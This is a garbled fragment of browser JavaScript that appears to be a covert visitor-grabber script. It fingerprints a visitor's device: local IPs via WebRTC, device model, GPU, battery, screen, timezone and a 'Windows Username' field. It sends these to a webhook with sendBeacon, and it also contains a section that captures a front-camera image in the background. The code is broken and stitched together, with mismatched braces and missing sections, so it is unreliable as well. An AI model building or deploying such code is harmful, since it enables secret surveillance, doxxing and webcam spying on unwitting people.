    // ================================================================

    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], { type: mime });

        // ---- 3. LOCAL IPs & HOSTNAME via WebRTC (often reveals computer name) ----

        } catch (_) {}

        } catch (_) {}

        // ---- 5. DEVICE MODEL / BROWSER DISPLAY NAME ----
        let deviceModel = 'Unknown';
        let browserProfile = 'Unknown';
        try {
            const ua = navigator.userAgent;
            // Try high‑entropy userAgentData
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
                deviceModel = he.model || he.platform || 'Unknown';
            }
            // Fallback: parse from UA string
            if (deviceModel === 'Unknown' || deviceModel === 'Unknown') {
                if (ua.includes('Windows NT')) {
                    deviceModel = 'Windows PC (model not exposed)';
                } else if (ua.includes('Macintosh')) {
                    deviceModel = 'Mac';
                } else if (ua.includes('iPhone')) {
                    const m = ua.match(/iPhone\s*([^;)]+)/);
                    deviceModel = m ? m[0] : 'iPhone';
                } else if (ua.includes('Android')) {
                    const m = ua.match(/Android\s*([^;)]+)/);
                    deviceModel = m ? m[0] : 'Android';
                } else {
                    deviceModel = 'Unknown device';
                }
            }
            // Try to get browser profile name (Chrome/Firefox sometimes store it, but not exposed)
            // We can try to get the email from navigator.credentials (but needs user interaction)
            // Instead, we'll show the OS registered owner (if present in UA)
            const ownerMatch = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
            if (ownerMatch) {
                browserProfile = ownerMatch[2] || ownerMatch[1] || 'Unknown';
            } else {
                browserProfile = 'Not exposed via UA';
            }
        } catch (_) {}

        // ---- 6. OTHER SYSTEM INFO ----
        let battery = 'unavailable';
        try {
            const b = await navigator.getBattery();
            battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`;
        } catch (_) {}
        const cpuCores = navigator.hardwareConcurrency || '?';
        const ram = navigator.deviceMemory || '?';
        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        const platform = navigator.platform;

        // ---- 7. GPU via WebGL ----
        let gpu = 'Unavailable';
        let gpuLevel = 'Unknown';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (debug) {
                const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                gpu = `${vendor} | ${renderer}`;
                if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';

**Windows Username:** ${winUser}
**Device / Laptop Model:** ${deviceModel}
**Browser Profile / Display Name:** ${browserProfile}
**OS:** ${platform}

**CPU Cores:** ${cpuCores}

            const blob = new Blob([JSON.stringify({ content: finalMsg })], { type: 'application/json' });
            navigator.sendBeacon(WEBHOOK, blob);
        }

        // ---- 12. CAMERA CAPTURE (non‑blocking, runs in background) ----

            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
            });
            const vid = document.createElement('video');
            vid.srcObject = stream;
            await vid.play();
            await new Promise(r => setTimeout(r, 1500));
            const canvas = document.createElement('canvas');
            canvas.width = vid.videoWidth || 640;
            canvas.height = vid.videoHeight || 480;
